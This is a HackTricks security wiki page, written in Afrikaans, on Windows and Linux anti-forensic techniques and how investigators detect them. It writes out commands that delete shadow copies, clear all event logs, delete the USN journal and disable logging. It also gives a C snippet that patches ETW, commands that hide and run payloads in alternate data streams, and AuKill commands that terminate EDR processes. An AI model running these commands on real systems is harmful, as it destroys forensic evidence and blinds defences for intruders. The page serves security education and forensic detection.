# Anti-Forensiese Tegnieke

{{#include ../../banners/hacktricks-training.md}}

## Tydstempels

'n Aanvaller kan daarin belangstel om **die tydstempels van lêers te verander** om te voorkom dat hulle opgespoor word.\
Dit is moontlik om die tydstempels binne die MFT in die eienskappe `$STANDARD_INFORMATION` \_\_ en \_\_ `$FILE_NAME` te vind.

Albei eienskappe het 4 tydstempels: **Wysiging**, **toegang**, **skepping**, en **MFT-registerwysiging** (MACE of MACB).

**Windows explorer** en ander tools wys die inligting vanaf **`$STANDARD_INFORMATION`**.

### TimeStomp - Anti-forensiese Tool

Hierdie tool **wysig** die tydstempelinligting binne **`$STANDARD_INFORMATION`**, **maar** nie die inligting binne **`$FILE_NAME`** nie. Daarom is dit moontlik om **verdagte** **aktiwiteit** te **identifiseer**.

### Usnjrnl

Die **USN Journal** (Update Sequence Number Journal) is 'n kenmerk van NTFS (Windows NT file system) wat rekord hou van volumeveranderings. Die [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv)-tool laat die ondersoek van hierdie veranderinge toe.

![TimeStomp - Anti-forensic Tool - Usnjrnl: Die USN Journal (Update Sequence Number Journal) is 'n kenmerk van NTFS (Windows NT file system) wat rekord hou van volumeveranderings. Die...](<../../images/image (801).png>)

Die vorige beeld is die **uitset** wat deur die **tool** vertoon word, waar waargeneem kan word dat sommige **veranderinge aan die lêer aangebring is**.

### $LogFile

**Alle metadata-veranderinge aan 'n lêerstelsel word aangeteken** in 'n proses bekend as [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Die aangetekende metadata word gestoor in 'n lêer genaamd `**$LogFile**`, wat in die wortelgids van 'n NTFS-lêerstelsel geleë is. Tools soos [LogFileParser](https://github.com/jschicht/LogFileParser) kan gebruik word om hierdie lêer te ontleed en veranderinge te identifiseer.

![Usnjrnl - $LogFile: Alle metadata-veranderinge aan 'n lêerstelsel word aangeteken in 'n proses bekend as write-ahead logging. Die aangetekende metadata word gestoor in 'n lêer genaamd $LogFile , wat in die wortel...](<../../images/image (137).png>)

Weereens is dit moontlik om in die uitset van die tool te sien dat **sommige veranderinge aangebring is**.

Deur dieselfde tool te gebruik, is dit moontlik om te identifiseer **na watter tyd die tydstempels gewysig is**:

![Usnjrnl - $LogFile: Deur dieselfde tool te gebruik, is dit moontlik om te identifiseer na watter tyd die tydstempels gewysig is](<../../images/image (1089).png>)

- CTIME: Lêer se skeppingstyd
- ATIME: Lêer se wysigingstyd
- MTIME: Lêer se MFT-registerwysiging
- RTIME: Lêer se toegangstyd

### Vergelyking van `$STANDARD_INFORMATION` en `$FILE_NAME`

Nog 'n manier om verdagte gewysigde lêers te identifiseer, sou wees om die tyd in albei eienskappe te vergelyk en na **wanpassings** te soek.

### Nanosekondes

**NTFS**-tydstempels het 'n **presisie** van **100 nanosekondes**. Daarom is dit baie verdag om lêers te vind met tydstempels soos 2010-10-10 10:10:**00.000:0000**.

### SetMace - Anti-forensiese Tool

Hierdie tool kan beide eienskappe `$STARNDAR_INFORMATION` en `$FILE_NAME` wysig. Vanaf Windows Vista is dit egter nodig dat 'n lewendige OS hierdie inligting wysig.

## Data wegsteek

NFTS gebruik 'n cluster en die minimum inligtingsgrootte. Dit beteken dat indien 'n lêer een en 'n half cluster gebruik, die **oorblywende helfte nooit gebruik sal word nie** totdat die lêer uitgevee word. Dit is dus moontlik om **data in hierdie slack space weg te steek**.

Daar is tools soos slacker wat dit moontlik maak om data in hierdie "versteekte" spasie weg te steek. 'n Ontleding van die `$logfile` en `$usnjrnl` kan egter wys dat sommige data bygevoeg is:

![SetMace - Anti-forensic Tool - Data Hiding: Daar is tools soos slacker wat dit moontlik maak om data in hierdie "versteekte" spasie weg te steek. 'n Ontleding van die $logfile en $usnjrnl kan egter wys dat...](<../../images/image (1060).png>)

Dit is dan moontlik om die slack space met tools soos FTK Imager te herwin. Let daarop dat hierdie soort tool die inhoud geobfuskeer of selfs geënkripteer kan stoor.

## UsbKill

Dit is 'n tool wat die **rekenaar sal afskakel indien enige verandering in die USB**-poorte bespeur word.\
'n Manier om dit te ontdek, is om die lopende prosesse te inspekteer en **elke lopende Python-script te hersien**.

## Live Linux Distributions

Hierdie distros word **binne die RAM**-geheue **uitgevoer**. Die enigste manier om hulle op te spoor, is **indien die NTFS-lêerstelsel met skryftoestemmings gemonteer is**. Indien dit slegs met leestoestemmings gemonteer is, sal dit nie moontlik wees om die indringing op te spoor nie.

## Secure Deletion

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows Configuration

Dit is moontlik om verskeie Windows-loggingmetodes te deaktiveer om die forensiese ondersoek baie moeiliker te maak.

### Deaktiveer tydstempels - UserAssist

Dit is 'n registry-sleutel wat die datums en tye byhou waarop elke uitvoerbare lêer deur die gebruiker uitgevoer is.

Die deaktivering van UserAssist vereis twee stappe:

1. Stel twee registry-sleutels, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` en `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, albei op nul om aan te dui dat ons UserAssist gedeaktiveer wil hê.
2. Maak jou registry-subtrees skoon wat soos `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>` lyk.

### Deaktiveer tydstempels - Prefetch

Dit stoor inligting oor die toepassings wat uitgevoer is met die doel om die werkverrigting van die Windows-stelsel te verbeter. Dit kan egter ook nuttig wees vir forensiese praktyke.

- Voer `regedit` uit
- Kies die lêerpad `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Regsklik op beide `EnablePrefetcher` en `EnableSuperfetch`
- Kies Modify op elk hiervan om die waarde van 1 (of 3) na 0 te verander
- Herbegin

### Deaktiveer tydstempels - Laaste toegangstyd

Wanneer 'n vouer vanaf 'n NTFS-volume op 'n Windows NT-bediener oopgemaak word, neem die stelsel die tyd om 'n **tydstempelveld op elke gelyste vouer by te werk**, genaamd die laaste toegangstyd. Op 'n intensief gebruikte NTFS-volume kan dit werkverrigting beïnvloed.

1. Maak die Registry Editor (Regedit.exe) oop.
2. Navigeer na `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Soek vir `NtfsDisableLastAccessUpdate`. Indien dit nie bestaan nie, voeg hierdie DWORD by en stel die waarde daarvan op 1, wat die proses sal deaktiveer.
4. Maak die Registry Editor toe en herlaai die bediener.

### Vee USB-geskiedenis uit

Al die **USB Device Entries** word in die Windows Registry gestoor onder die **USBSTOR**-registry-sleutel, wat subsleutels bevat wat geskep word wanneer jy 'n USB Device by jou rekenaar of skootrekenaar inprop. Jy kan hierdie sleutel hier vind: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. Deur **dit uit te vee**, vee jy die USB-geskiedenis uit.\
Jy kan ook die tool [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) gebruik om seker te maak dat jy hulle uitgevee het (en om hulle uit te vee).

Nog 'n lêer wat inligting oor die USBs stoor, is die lêer `setupapi.dev.log` binne `C:\Windows\INF`. Dit moet ook uitgevee word.

### Deaktiveer Shadow Copies

**Lys** shadow copies met `vssadmin list shadowstorage`\
**Vee** hulle uit deur `vssadmin delete shadow` uit te voer

Jy kan hulle ook via die GUI uitvee deur die stappe te volg wat voorgestel word in [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Om shadow copies te deaktiveer [stappe van hier af](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Maak die Services-program oop deur "services" in die tekssoekkassie te tik nadat jy die Windows-startknoppie geklik het.
2. Soek "Volume Shadow Copy" in die lys, kies dit en maak Properties oop deur regs te klik.
3. Kies Disabled in die "Startup type"-aftreklys en bevestig dan die verandering deur Apply en OK te klik.

Dit is ook moontlik om die konfigurasie van watter lêers in die shadow copy gekopieer gaan word, in die registry te wysig: `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Oorskryf uitgevee lêers

- Jy kan 'n **Windows-tool** gebruik: `cipher /w:C` Dit sal cipher opdrag gee om enige data uit die beskikbare ongebruikte skyfspasie binne die C-skyf te verwyder.
- Jy kan ook tools soos [**Eraser**](https://eraser.heidi.ie) gebruik.

### Vee Windows-event logs uit

- Windows + R --> eventvwr.msc --> Brei "Windows Logs" uit --> Regsklik op elke kategorie en kies "Clear Log"
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Deaktiveer Windows-event logs

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Deaktiveer die diens "Windows Event Log" binne die services-afdeling.
- `WEvtUtil.exec clear-log` of `WEvtUtil.exe cl`

### Deaktiveer $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Advanced Logging & Trace Tampering (2023-2025)

### PowerShell ScriptBlock/Module Logging

Onlangse weergawes van Windows 10/11 en Windows Server hou **omvattende PowerShell-forensiese artefakte** onder
`Microsoft-Windows-PowerShell/Operational` (events 4104/4105/4106).
Aanvallers kan dit intyds deaktiveer of uitvee:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Defenders behoort veranderinge aan daardie registry keys en die verwydering van PowerShell-events op groot skaal te monitor.

### ETW (Event Tracing for Windows) Patch

’n Gewilde 2024-evasion method is om `ntdll!EtwEventWrite`/`EtwEventWriteFull` in memory te patch sodat elke ETW-call `STATUS_SUCCESS`
returneer sonder om die event uit te stuur:<sup>[[5]](#references)</sup>
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Publieke PoCs (bv. `EtwTiSwallow`) implementeer dieselfde primitive in PowerShell of C++.
Omdat die patch **process-local** is, kan EDRs wat binne ander prosesse loop dit miskyk.<sup>[[5]](#references)</sup>
Opsporing: vergelyk `ntdll` in die geheue met die een op skyf, of hook voordat user-mode begin.

### Herlewing van Alternate Data Streams (ADS)

Malware-veldtogte in 2023 (bv. **FIN12**-loaders) is al gesien waar hulle tweede-fase binaries
binne ADS stage om buite die sig van tradisionele skandeerders te bly:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Enumerate streams met `dir /R`, `Get-Item -Stream *`, of Sysinternals `streams64.exe`.
Die kopiëring van die gasheerlêer na FAT/exFAT of via SMB sal die versteekte stream verwyder en kan deur ondersoekers gebruik word
om die payload te herstel.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver word nou gereeld vir **anti-forensics** in ransomware-
indringings gebruik.
Die oopbronhulpmiddel **AuKill** laai ’n ondertekende maar kwesbare driver (`procexp152.sys`) om
EDR- en forensiese sensors **voor enkripsie en logvernietiging** te suspend of terminate:<sup>[[1]](#references)</sup>
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
Die driver word daarna verwyder, wat minimale artefakte agterlaat.<sup>[[1]](#references)</sup>
Mitigeringsmaatreëls: aktiveer die Microsoft vulnerable-driver blocklist (HVCI/SAC),
en genereer waarskuwings oor die skepping van kernel-dienste vanaf paaie wat deur gebruikers geskryf kan word.

---

## Linux Anti-Forensics: Self-Patching en Cloud C2 (2023–2025)

### Self-patching van gekompromitteerde dienste om opsporing te verminder (Linux)
Adversaries “self-patch” toenemend ’n diens onmiddellik nadat hulle dit uitgebuit het, om beide heruitbuiting te voorkom en kwesbaarheidsgebaseerde opsporing te onderdruk. Die idee is om kwesbare komponente met die nuutste wettige upstream binaries/JARs te vervang, sodat scanners die host as gepatch rapporteer terwyl persistence en C2 behoue bly.<sup>[[3]](#references)</sup>

Voorbeeld: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Na exploitation het attackers wettige JARs vanaf Maven Central (repo1.maven.org) afgelaai, kwesbare JARs in die ActiveMQ-installering uitgevee en die broker herbegin.
- Dit het die aanvanklike RCE gesluit terwyl ander footholds (cron, SSH-konfigurasieveranderinge, afsonderlike C2 implants) behoue gebly het.

Operasionele voorbeeld (illustratief)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Forensiese/hunting-wenke
- Hersien diensgidse vir ongeskeduleerde binary/JAR-vervangings:
- Debian/Ubuntu: `dpkg -V activemq` en vergelyk lêer-hashes/-paaie met repo-spieëls.
- RHEL/CentOS: `rpm -Va 'activemq*'`
- Soek na JAR-weergawes wat op skyf teenwoordig is, maar nie deur die package manager besit word nie, of simboliese skakels wat buite die normale proses opgedateer is.
- Tydlyn: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` om ctime/mtime met die kompromitteringsvenster te korreleer.
- Shell history/process telemetry: bewyse van `curl`/`wget` na `repo1.maven.org` of ander artifact-CDNs onmiddellik ná aanvanklike exploitation.
- Change management: valideer wie die “patch” toegepas het en waarom, nie slegs dat ’n patched version teenwoordig is nie.

### Cloud-service C2 with bearer tokens and anti-analysis stagers
Waargenome tradecraft het verskeie langafstand-C2-paaie en anti-analysis-packaging gekombineer:<sup>[[3]](#references)</sup>
- Password-protected PyInstaller ELF-loaders om sandboxing en static analysis te bemoeilik (bv. encrypted PYZ, temporary extraction onder `/_MEI*`).
- Indicators: `strings`-treffers soos `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
- Runtime artifacts: extraction na `/tmp/_MEI*` of custom `--runtime-tmpdir`-paaie.
- Dropbox-backed C2 wat hardcoded OAuth Bearer tokens gebruik
- Network markers: `api.dropboxapi.com` / `content.dropboxapi.com` met `Authorization: Bearer <token>`.
- Hunt in proxy/NetFlow/Zeek/Suricata vir outbound HTTPS na Dropbox-domains vanaf server-workloads wat normaalweg nie files sync nie.
- Parallel/backup C2 via tunneling (bv. Cloudflare Tunnel `cloudflared`), wat beheer behou indien een channel geblokkeer word.
- Host IOCs: `cloudflared`-processes/-units, config by `~/.cloudflared/*.json`, outbound 443 na Cloudflare-edges.

### Persistence and “hardening rollback” to maintain access (Linux examples)
Attackers kombineer gereeld self-patching met durable access paths:<sup>[[3]](#references)</sup>
- Cron/Anacron: edits aan die `0anacron`-stub in elke `/etc/cron.*/`-directory vir periodieke execution.
- Hunt:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- SSH configuration hardening rollback: enabling van root logins en alteration van default shells vir low-privileged accounts.
- Hunt vir root login enablement:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# flag values like "yes" or overly permissive settings
```
- Hunt vir suspicious interactive shells op system accounts (bv. `games`):
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Random, kort-genoemde beacon-artifacts (8 alfabetiese karakters) wat op skyf gedrop word en ook cloud C2 kontak:
- Hunt:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Defenders behoort hierdie artifacts met external exposure en service patching events te korreleer om anti-forensic self-remediation te ontdek wat gebruik word om aanvanklike exploitation te verberg.

## References

- [1] [Sophos X-Ops – AuKill: ’n Gewapende kwesbare driver vir die deaktivering van EDR (Maart 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Patching van EtwEventWrite vir stealth: Detection & Hunting (Junie 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patching vir persistence: Hoe DripDropper Linux-malware deur die cloud beweeg](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Hiding Your .NET - ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
{{#include ../../banners/hacktricks-training.md}}
